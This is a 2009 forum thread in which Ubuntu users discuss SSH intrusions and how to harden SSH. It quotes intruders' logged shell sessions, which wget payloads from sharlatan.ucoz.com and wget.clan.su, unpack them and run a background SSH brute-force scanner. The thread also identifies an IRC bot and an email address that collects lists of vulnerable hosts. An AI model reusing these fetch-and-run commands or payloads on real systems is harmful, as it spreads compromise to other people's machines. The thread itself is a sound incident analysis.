---
title: "Hacked... and given an unknown file"
date: 2009-01-07
forum: Security
---

### Post by cwill747 on 2009-01-07
So last night I happened to be looking at my computer, and somebody was logged in remotely. They were only in for about a minute before i kicked them out and shut my ssh and vnc ports (not to mention turning off my internet) but I don't know how they did it. but that's another discussion for me to figure out.

My question is that when they were in, they used wget and got the files "sharlatan.ucoz.com/satanis.tgz" and "sharlatan.ucoz.com/ssh.tar". They unpacked the ssh.tar file, and ran the executable with the "nohup" option. Heres the full thing:
```
:~/  $ wget sharlatan.ucoz.com/ssh.tar
--2009-01-06 22:22:32--  http://sharlatan.ucoz.com/ssh.tar
:~/  $ wget sharlatan.ucoz.com/satanis.tgz
--2009-01-06 22:22:59--  http://sharlatan.ucoz.com/satanis.tgz
:~/  $ tar zxvf ssh.tar
:~/  $ cd scan
:~/  /scan$ chmod +x *
:~/  /scan$ cat README
@ pentru scanare in background dai : nohup ./start 211 >> /dev/null &

@ pentru normal dai : ./start 211.211

211 si 211.211 sint exemple ca stiu ca sint unii retardati care nu pricep.

bafta
eof OmAr
:~/  /scan$ nohup ./start 205 >> /dev/null &
[1] 2352
nohup: ignoring input and redirecting stderr to stdout
```

That's as far as they got. I know what they did until they ran the file. any help?

---

### Post by sPiN1 on 2009-01-07
yikes it must have been someone you knew because people don't tend to focus on linux over windows sorry i can't help you though :(

---

### Post by tuxxy on 2009-01-07
Who else has knows about you running ssh

---

### Post by cwill747 on 2009-01-07
yeah... i whois'd the ip addresses that my router caught and i came up with a chinese server and a server for a college. so idk who it was.

---

### Post by cwill747 on 2009-01-07
> **tuxxy said:**
> Who else has knows about you running ssh
absolutely nobody. I just set up my router to forward ssh to my machine from my router 2 days ago, and this happened a day later. Coincidence? I have no idea

---

### Post by sPiN1 on 2009-01-07
> **cwill747 said:**
> yeah... i whois'd the ip addresses that my router caught and i came up with a chinese server and a server for a college. so idk who it was.

whoever it was knew you weren't an idiot cause they seemed to cover themselves up pretty good. :KS

---

### Post by cwill747 on 2009-01-07
> **sPiN1 said:**
> whoever it was knew you weren't an idiot cause they seemed to cover themselves up pretty good. :KS

Yeah if only i could know who they were. they actually seemed really dumb, the first thing they did when they logged on was ls'd my home directory and looked at my cpuinfo. idk why you'd do that...

---

### Post by sPiN1 on 2009-01-07
> **cwill747 said:**
> Yeah if only i could know who they were. they actually seemed really dumb, the first thing they did when they logged on was ls'd my home directory and looked at my cpuinfo. idk why you'd do that...

maybe it was a random attack and they wanted to know who/what you were and what you were running? lol

---

### Post by cwill747 on 2009-01-07
> **sPiN1 said:**
> maybe it was a random attack and they wanted to know who/what you were and what you were running? lol

i guess. i just figured they were showing off. they were only in for a little bit. anybody know what satanis is? or the scan thing?

---

### Post by albinootje on 2009-01-07
> **cwill747 said:**
> 
That's as far as they got. I know what they did until they ran the file. any help?

Which Ubuntu release are you using and which sshd version ?
Does your user have a strong password ?
Do you have root access disabled for sshd ?

There was a very serious OpenSSL bug a while ago.

And have you been using your VNC connection with or without encryption ?
To check the versions :
```

openssl version
dpkg -l|grep ssh

```

It's recommended that you start from a Linux Live CD and run rkhunter and chkrootkit *for* your Ubuntu partition(s).

Or make a good copy of their files, and clone your disk or partitions (CloneZilla) and do a fresh install.

---

### Post by heindsight on 2009-01-07
This was probably not a person. It's a program running on a remote computer somewhere which spends all it's time looking for machines with open ssh ports. As soon as it finds one, it starts trying to log in trying thousands of username/password combinations. If it manages to log in, it downloads a copy of itself to your computer (that would be the ssh.tar file), extracts it and starts running - so that your computer can also start attacking other machines. I'm not sure what the satanis.tgz file is.

To avoid this sort of thing happening, you should have a more secure password, configure your sshd to only allow public key authentication, and perhaps install denyhosts (denyhosts.sourceforge.net available in the ubuntu repos).

EDIT: I've looked at both those files, as i thought ssh.tar contains a shell script for scanning a bunch of ip addresses and then apparently attempts to ssh into any machines found with an open ssh port, it also attempts to email a list of vulnerable hosts to [email]sharlatan_sacalu@yahoo.com[/email].

i'm still not entirely sure about satanis.tgz but it seems to have something to do with IRC - my guess is that it's intended to allow someone to remotely control your machine via IRC

---

### Post by cwill747 on 2009-01-07
Which Ubuntu release are you using and which sshd version ? **8.10**
Does your user have a strong password ? **Yes, Very**
Do you have root access disabled for sshd ? **Yep**

And have you been using your VNC connection with or without encryption ? **Been tunneling through ssh, might have forgotten to one time**

---

### Post by cwill747 on 2009-01-07
> **heindsight said:**
> This was probably not a person. It's a program running on a remote computer somewhere which spends all it's time looking for machines with open ssh ports. As soon as it finds one, it starts trying to log in trying thousands of username/password combinations. If it manages to log in, it downloads a copy of itself to your computer (that would be the ssh.tar file), extracts it and starts running - so that your computer can also start attacking other machines. I'm not sure what the satanis.tgz file is.

To avoid this sort of thing happening, you should have a more secure password, configure your sshd to only allow public key authentication, and perhaps install denyhosts (denyhosts.sourceforge.net available in the ubuntu repos).

EDIT: I've looked at both those files, as i thought ssh.tar contains a shell script for scanning a bunch of ip addresses and then apparently attempts to ssh into any machines found with an open ssh port, it also attempts to email a list of vulnerable hosts to [email]sharlatan_sacalu@yahoo.com[/email].

i'm still not entirely sure about satanis.tgz but it seems to have something to do with IRC - my guess is that it's intended to allow someone to remotely control your machine via IRC

Thanks a lot. I've actually done some digging, found out it's exactly the bug you mentioned. The satanis.tgz apparently is an IRC bot that might do what you mentioned. The whole thing is romanian. who would've guessed.

---

### Post by sPiN1 on 2009-01-07
It's good to know it wasn't a person but damn you know that bot got many people.

---

### Post by albinootje on 2009-01-07
> **cwill747 said:**
> 
If you *really* had an up to date sshd running with strong passwords and with root access via ssh disabled, and perhaps forgot one time to tunnel VNC through ssh, then I see only a few options :

I actually forgot something. 
Did you have ports open for VNC ? 
Did VNC server run on your own computer ?

Did you access VNC from some Windows computer from someone else ?

How good was your firewall setup ? 
Anything else open ? 
The latest firmware on your DSL-router or cable-modem ? 
Only trusted users in your LAN ?

It reminds me of a friend of mine who was running a server on his home DSL line. One day he called me, and we looked at the hard drive. We found out that he had temporarily set up some ftp account for a friend in the past (with a weak password!), and forgot about it later. There the attacker also were from Romania by coincidence, and also downloaded some software. They tried to hide their stuff. 
Like using ... as a directory next to the usual .. and . directory entries.

---

### Post by whoop on 2009-01-07
It would be interesting to see your log files. Especially auth log files. It is most likely a ssh brute force bot. To make sure we could check how many login attempts where made to your ssh server. This could tell us if it was a brute force or some kind of exploit. 
It is also interesting to see if the attack was distributed over several ip's (making it a slow brute force attack).

It concerns me that you (claim to) have a strong password, so I really would like to know how this bot got in.

---

### Post by cariboo on 2009-01-07
Seeing as ssh has been compromised, it's time to pull the hard drive and install on a new one, then you can spend all the time you want trying to discover how the attacker got into your system.

Once you've got things running again try the following on the compromised hard drive:

```
cat /var/log/auth.log | grep <attackers_ip_address>
```

This should allow you to see how the attacker got into your sytem.

---

### Post by albinootje on 2009-01-07
> **cariboo907 said:**
> 
```
cat /var/log/auth.log | <attackers_ip_address>
```

This should allow you to see how the attacker got into your sytem.

You probably meant :
```

cat /var/log/auth.log | grep "attackers_ip_address"
grep "attackers_ip_address" /var/log/auth.log

```

---

### Post by cariboo on 2009-01-07
> You probably meant :
Code:

cat /var/log/auth.log | grep "attackers_ip_address"
grep "attackers_ip_address" /var/log/auth.log



Yes I did, I was in a hurry. Thanks for catching the error.

Jim

---

### Post by Excedio on 2009-01-07
Out of curiosity and newness to the Linux world....how did you know that someone was in your computer? I mean...was it as simple as seeing the terminal window appear on your desktop or something?

---

### Post by jrusso2 on 2009-01-07
VNC is even worse then SSH. Thats why users that are not behind a firewalll need to learn how to secure their systems.

Linux may not be prone to virii but it sure is easy to hack it with these open open ports like SSH and VNC and this seems to happen to new users a lot.  So they focus on Linux boxes and do scan for SSH and VNC.

---

### Post by jrusso2 on 2009-01-07
> **sPiN1 said:**
> It's good to know it wasn't a person but damn you know that bot got many people.

There are hundreds of similiar things running around.

---

### Post by jflaker on 2009-01-07
> **cwill747 said:**
> absolutely nobody. I just set up my router to forward ssh to my machine from my router 2 days ago, and this happened a day later. Coincidence? I have no idea

If you have a port open long enough, it will be probed and eventually attacked......it really only takes a few minutes before you see activity

---

### Post by albinootje on 2009-01-07
> **Excedio said:**
> Out of curiosity and newness to the Linux world....how did you know that someone was in your computer? I mean...was it as simple as seeing the terminal window appear on your desktop or something?

It looked like the OP found some extra-unseen-before commands in the bash history from root or the normal user.
```

history

```

---

### Post by Wildgoosechaser on 2009-01-07
I too would like to know how you saw this person in your system. Maybe a few suggestions on how to lock these "ports" or what not . (I am still learning alot about this stuff). 

What are you going to do, or should do, to secure the SSH port thing?

---

### Post by Loosewheel on 2009-01-07
> **albinootje said:**
> It looked like the OP found some extra-unseen-before commands in the bash history from root or the normal user.
```

history

```

albinootje, is that something that should be cleared from time to time?

---

### Post by razar45 on 2009-01-07
rofl

---

### Post by Loosewheel on 2009-01-07
> **razar45 said:**
> rofl

What's 'rofl' ?

---

### Post by mssever on 2009-01-07
> **Wildgoosechaser said:**
> What are you going to do, or should do, to secure the SSH port thing?
I don't claim to know all the ins and outs of SSH security, but one thing that you can do is use key-based authentication and disable password authentication altogether. Key-based authentication is much more secure than password authentication. Of course, if you do this, you have to have your private key available whenever you want to log in.

---

### Post by razar45 on 2009-01-07
never mind...

---

### Post by albinootje on 2009-01-07
> **Loosewheel said:**
> albinootje, is that something that should be cleared from time to time?

The command "history" is the output from the .bash_history file in your home directory.
It has a certain buffer by default, it's not an endless amount of history by default.

Personally I like having it around, to look up certain things from the past as a reminder, or to see what i've done before on some machines.

---

### Post by Loosewheel on 2009-01-07
> **razar45 said:**
> never mind...

Ok.  What about clearing that history file?

albinootje,Sorry didn't see your post.

---

### Post by Kinstonian on 2009-01-08
If you want to find out how you were compromised, you need to check your system and application logs.

---

### Post by Chayak on 2009-01-08
> **cwill747 said:**
> Yeah if only i could know who they were. they actually seemed really dumb, the first thing they did when they logged on was ls'd my home directory and looked at my cpuinfo. idk why you'd do that...

They checked the cpuinfo to see what architecture it was running to see if their tools will run on it.  Most likely you were cracked by a bot it was just checking to see if it could run itself on your system before it copied itself over.  It's actually very common to see bruteforce attacks against standard ssh ports but if you were using a strong password then it could also have been a 0 day exploit against ssh or VNC.

---

### Post by Superdude_123 on 2009-01-08
What is a 0 day exploit and if the OP would have changed the orriginal SSH port from 22 to XYZ, could this have been avoided or was it just a matter of time?

---

### Post by mssever on 2009-01-09
> **Superdude_123 said:**
> What is a 0 day exploitSee [here]("http://letmegooglethatforyou.com/?q=zero+day+exploit").>  and if the OP would have changed the orriginal SSH port from 22 to XYZ, could this have been avoidedDepends on the type of attack.

---

### Post by albinootje on 2009-01-09
> **Superdude_123 said:**
> What is a 0 day exploit 
See here : [http://en.wikipedia.org/wiki/Zero_day_attack](http://en.wikipedia.org/wiki/Zero_day_attack)
> 
and if the OP would have changed the orriginal SSH port from 22 to XYZ, could this have been avoided or was it just a matter of time?

The brute-force ssh attacks are so far limited to port 22.

It's a pity that we didn't hear anything anymore from the OP.

---

### Post by Chayak on 2009-01-09
I downloaded and looked at the scripts.  It seems to be a series of shell scripts and small programs to find and bruteforce SSH servers.  Then when it gets it it checks the architecture and if it's compatable it'll get a copy of itself and an IRC bot onto the system and then run them.  It will occasionally email lists of servers back to it's controller too.

satanis.tgz is the IRC bot.

---

### Post by flatline on 2009-01-09
Now I am worried... I don't have VNC running, but my server has 22 open and forwarded by my router.  Is it possible to set a time-based limit or something on authentication attempts?  I have a strong password, but I'm sure it's not unbreakable.

---

### Post by troutbum13 on 2009-01-09
> **flatline said:**
> Now I am worried... I don't have VNC running, but my server has 22 open and forwarded by my router.  Is it possible to set a time-based limit or something on authentication attempts?  I have a strong password, but I'm sure it's not unbreakable.

check out denyhosts

---

### Post by albinootje on 2009-01-09
> **flatline said:**
> Now I am worried... I don't have VNC running, but my server has 22 open and forwarded by my router.  Is it possible to set a time-based limit or something on authentication attempts?  I have a strong password, but I'm sure it's not unbreakable.

You can restrict user and their ip-address access with AllowUsers and AllowGroups in /etc/ssh/sshd_config.

For example :
```

AllowUsers adrian@193.125.244.111 adrianus@192.168.0.* adriaan@85.81.55.123

```
Restart ssh after making those changes, and make sure you don't lock yourself out (typos) in case your machine is physically far away.

You can also use denyhosts or fail2ban.
See here :
[http://www.howtoforge.org/preventing_ssh_dictionary_attacks_with_denyhosts](http://www.howtoforge.org/preventing_ssh_dictionary_attacks_with_denyhosts)
Again, make sure you don't lock yourself out by mistake, you can "whitelist" your own ip-addresses with denyhosts.

---

### Post by mssever on 2009-01-09
> **flatline said:**
> Now I am worried... I don't have VNC running, but my server has 22 open and forwarded by my router.  Is it possible to set a time-based limit or something on authentication attempts?  I have a strong password, but I'm sure it's not unbreakable.
I suggest that you read through /etc/sshd_config, while simultaneously reading man sshd_config. Make your policy as restrictive as possible while still allowing you to do what you need to do.

---

### Post by ac7ss on 2009-02-24
Thanks for the denyhosts pointer.

I was recently hit via a weak passwd on my 'guest' account.
> w
passwd
w
ls
cd /dev/shm
ls
wget wget.clan.su/apache.tgz
tar xzvf apache.tgz 
wget [http://www.kernel.org/pub/dist/knoppix-dvd/KNOPPIX_V4.0.2DVD-2005-09-23-DE.iso](http://www.kernel.org/pub/dist/knoppix-dvd/KNOPPIX_V4.0.2DVD-2005-09-23-DE.iso)
ls
rm -rf KNOPPIX_V4.0.2DVD-2005-09-23-DE.iso
cd apache/
ls
mv EXPLOIT e
mv SCANNER s
chmod =x *
ls
chmod +x *
ls
screen
clear
screen
./s -s 77
./s -s 66
./s -s 152
Looking at the source and output file it was a brute portscan on a range of addresses. (likely how they found my open port) I caught it in the act, killed the processes and locked out the account (change the password and directed the shell to /dev/null.) It was fun watching the tries at authentication after the change. They are still trying to hack other usernames (using default/common usernames) but are not likely to find another backdoor. (I strengthened my passwd, root is still blocked and so on...)

---

### Post by Philo1 on 2009-02-25
I'm not really adding much to this but........WOW -- This is quite surprising as I haven't ever heard anything like this within Ubuntu - I firmly believe that the only 100% safe device is one that's flat out turned off but that's not a very feasible route to go. This is insightful to say the least, thanks for the discussion.

---

### Post by bodhi.zazen on 2009-02-26
If you install a ssh server and watch your logs you will see the ssh port (22) gets hammered.

This is preventable with a few easy steps :

1. Change the port. This is not simply security through obscurity, try it and watch your logs. This simple step cuts the traffic by 90 + %. Use this in combination with other tips.

2. Use keys.

3. Use strong passwords.

4. Limit which accounts can ssh in.

5. Use apparmor to limit what someone can do once the ssh in. Jdong published a nice blog on this issue here :

[http://www.friedcpu.net/?p=70](http://www.friedcpu.net/?p=70)

6. Use iptables or denyhosts or fail2ban.

A simple rule in iptables will stop all brute force attempts.

See : [http://bodhizazen.net/Tutorials/iptables](http://bodhizazen.net/Tutorials/iptables)

See also : [https://help.ubuntu.com/community/AdvancedOpenSSH](https://help.ubuntu.com/community/AdvancedOpenSSH)

---

